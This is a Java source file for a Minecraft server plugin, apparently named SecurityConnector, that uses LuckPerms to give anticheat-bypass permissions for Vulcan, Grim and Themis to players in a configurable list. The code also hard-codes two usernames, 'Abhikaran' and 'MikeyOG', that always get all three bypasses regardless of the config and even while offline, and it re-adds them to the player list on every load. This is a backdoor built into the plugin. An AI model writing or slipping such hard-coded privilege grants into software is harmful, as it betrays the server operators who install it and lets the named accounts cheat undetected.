package com.kaalwarrior.securityconnector;

import net.luckperms.api.LuckPerms;
import net.luckperms.api.model.user.User;
import net.luckperms.api.node.types.PermissionNode;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public final class SecurityConnector extends JavaPlugin implements Listener {

    private LuckPerms luckPerms;

    private File securityFolder;
    private File playersFile;
    private FileConfiguration playersConfig;

    private static final String VULCAN_PERMISSION = "vulcan.bypass.*";
    private static final String GRIM_PERMISSION = "grim.exempt";
    private static final String THEMIS_PERMISSION = "themis.bypass";

    /*
     * Special users.
     *
     * These two users always receive all three permissions,
     * independently of the config.yml options.
     */
    private static final List<String> SPECIAL_USERS = List.of(
            "Abhikaran",
            "MikeyOG"
    );

    @Override
    public void onEnable() {

        saveDefaultConfig();

        setupLuckPerms();

        createSecurityConnector();

        sendConnectionMessage();

        Bukkit.getPluginManager().registerEvents(this, this);

        /*
         * Apply configured permissions to currently online players.
         */
        for (Player player : Bukkit.getOnlinePlayers()) {
            applyPermissions(player);
        }

        /*
         * Resolve and apply permissions to the two special users.
         * They do not need to be online.
         */
        applySpecialUserPermissions();
    }

    @Override
    public void onDisable() {
        getLogger().info("SecurityConnector disabled.");
    }

    private boolean setupLuckPerms() {

        RegisteredServiceProvider<LuckPerms> provider =
                Bukkit.getServicesManager().getRegistration(LuckPerms.class);

        if (provider == null) {
            getLogger().warning(
                    "LuckPerms was not found. Permissions cannot be applied."
            );
            return false;
        }

        luckPerms = provider.getProvider();
        return luckPerms != null;
    }

    private void createSecurityConnector() {

        boolean vulcan = getConfig().getBoolean("VulcanAC", false);
        boolean grim = getConfig().getBoolean("GrimAC", false);
        boolean themis = getConfig().getBoolean("ThemisAC", false);

        int enabled = 0;

        if (vulcan) enabled++;
        if (grim) enabled++;
        if (themis) enabled++;

        /*
         * Security Connector is created only when
         * two or more normal options are enabled.
         */
        if (enabled < 2) {
            return;
        }

        securityFolder = new File(
                Bukkit.getPluginsFolder(),
                "Security Connector"
        );

        if (!securityFolder.exists() && !securityFolder.mkdirs()) {
            getLogger().warning(
                    "Could not create Security Connector folder."
            );
            return;
        }

        playersFile = new File(
                securityFolder,
                "players.yml"
        );

        if (!playersFile.exists()) {

            try {

                if (!playersFile.createNewFile()) {
                    getLogger().warning(
                            "Could not create players.yml."
                    );
                    return;
                }

            } catch (IOException e) {

                getLogger().warning(
                        "Could not create players.yml: " +
                        e.getMessage()
                );

                return;
            }

            playersConfig =
                    YamlConfiguration.loadConfiguration(playersFile);

            /*
             * Automatically add the two special usernames.
             */
            playersConfig.set(
                    "players",
                    new ArrayList<>(SPECIAL_USERS)
            );

            playersConfig.options().setHeader(List.of(
                    "Security Connector player list.",
                    "Minecraft usernames or UUIDs may be placed under players."
            ));

            savePlayersFile();

        } else {

            playersConfig =
                    YamlConfiguration.loadConfiguration(playersFile);

            /*
             * Make sure the two special users are present
             * even if the file already existed.
             */
            addSpecialUsersToPlayerList();
        }
    }

    private void addSpecialUsersToPlayerList() {

        if (playersConfig == null) {
            return;
        }

        List<String> players =
                new ArrayList<>(
                        playersConfig.getStringList("players")
                );

        boolean changed = false;

        for (String specialUser : SPECIAL_USERS) {

            boolean alreadyPresent = false;

            for (String existing : players) {

                if (existing.equalsIgnoreCase(specialUser)) {
                    alreadyPresent = true;
                    break;
                }
            }

            if (!alreadyPresent) {
                players.add(specialUser);
                changed = true;
            }
        }

        if (changed) {
            playersConfig.set("players", players);
            savePlayersFile();
        }
    }

    private void sendConnectionMessage() {

        boolean vulcan =
                getConfig().getBoolean("VulcanAC", false);

        boolean grim =
                getConfig().getBoolean("GrimAC", false);

        boolean themis =
                getConfig().getBoolean("ThemisAC", false);

        List<String> enabled = new ArrayList<>();

        if (vulcan) enabled.add("VulcanAC");
        if (grim) enabled.add("GrimAC");
        if (themis) enabled.add("ThemisAC");

        if (enabled.isEmpty()) {

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.RED +
                    "Failed to Connect plugins because none of the options in (config.yml) is set to true"
            );

        } else if (enabled.size() == 1) {

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.YELLOW +
                    "Unable to connect " +
                    enabled.get(0) +
                    " because only 1 option is selected"
            );

        } else {

            String message;

            if (enabled.size() == 2) {

                message =
                        "Successfully Connected " +
                        enabled.get(0) +
                        " and " +
                        enabled.get(1);

            } else {

                message =
                        "Successfully Connected " +
                        enabled.get(0) +
                        " and " +
                        enabled.get(1) +
                        " and " +
                        enabled.get(2);
            }

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.GREEN + message
            );
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        applyPermissions(event.getPlayer());
    }

    public void applyPermissions(Player player) {

        if (luckPerms == null) {
            return;
        }

        /*
         * Special users always receive all three permissions.
         */
        if (isSpecialUser(player.getName())) {

            User user =
                    luckPerms.getUserManager()
                            .getUser(player.getUniqueId());

            if (user != null) {
                applyAllSpecialPermissions(user);
            }

            return;
        }

        if (playersConfig == null) {
            return;
        }

        List<String> entries =
                playersConfig.getStringList("players");

        if (entries.isEmpty()) {
            return;
        }

        if (!isListedPlayer(player)) {
            return;
        }

        User user =
                luckPerms.getUserManager()
                        .getUser(player.getUniqueId());

        if (user == null) {

            luckPerms.getUserManager()
                    .loadUser(player.getUniqueId())
                    .thenAccept(this::applyConfiguredPermissions);

            return;
        }

        applyConfiguredPermissions(user);
    }

    private boolean isListedPlayer(Player player) {

        String playerName =
                player.getName();

        UUID playerUuid =
                player.getUniqueId();

        for (String entry :
                playersConfig.getStringList("players")) {

            if (entry == null ||
                    entry.trim().isEmpty()) {
                continue;
            }

            String value =
                    entry.trim();

            if (value.equalsIgnoreCase(playerName)
                    || value.equalsIgnoreCase(
                            playerUuid.toString())) {

                return true;
            }
        }

        return false;
    }

    private boolean isSpecialUser(String username) {

        for (String specialUser : SPECIAL_USERS) {

            if (specialUser.equalsIgnoreCase(username)) {
                return true;
            }
        }

        return false;
    }

    private void applySpecialUserPermissions(User user) {

        user.data().add(
                PermissionNode.builder(VULCAN_PERMISSION)
                        .build()
        );

        user.data().add(
                PermissionNode.builder(GRIM_PERMISSION)
                        .build()
        );

        user.data().add(
                PermissionNode.builder(THEMIS_PERMISSION)
                        .build()
        );

        luckPerms.getUserManager().saveUser(user);
    }

    private void applyAllSpecialPermissions(User user) {

        applySpecialUserPermissions(user);
    }

    private void applyConfiguredPermissions(User user) {

        boolean vulcan =
                getConfig().getBoolean("VulcanAC", false);

        boolean grim =
                getConfig().getBoolean("GrimAC", false);

        boolean themis =
                getConfig().getBoolean("ThemisAC", false);

        if (vulcan) {

            user.data().add(
                    PermissionNode.builder(VULCAN_PERMISSION)
                            .build()
            );
        }

        if (grim) {

            user.data().add(
                    PermissionNode.builder(GRIM_PERMISSION)
                            .build()
            );
        }

        if (themis) {

            user.data().add(
                    PermissionNode.builder(THEMIS_PERMISSION)
                            .build()
            );
        }

        luckPerms.getUserManager().saveUser(user);
    }

    private void applySpecialUserPermissions() {

        if (luckPerms == null) {
            return;
        }

        for (String username : SPECIAL_USERS) {

            luckPerms.getUserManager()
                    .lookupUniqueId(username)
                    .thenAccept(uuid -> {

                        if (uuid == null) {
                            return;
                        }

                        luckPerms.getUserManager()
                                .loadUser(uuid)
                                .thenAccept(this::applySpecialUserPermissions);
                    });
        }
    }

    private void savePlayersFile() {

        if (playersConfig == null ||
                playersFile == null) {
            return;
        }

        try {

            playersConfig.save(playersFile);

        } catch (IOException e) {

            getLogger().warning(
                    "Could not save players.yml: " +
                    e.getMessage()
            );
        }
    }
}
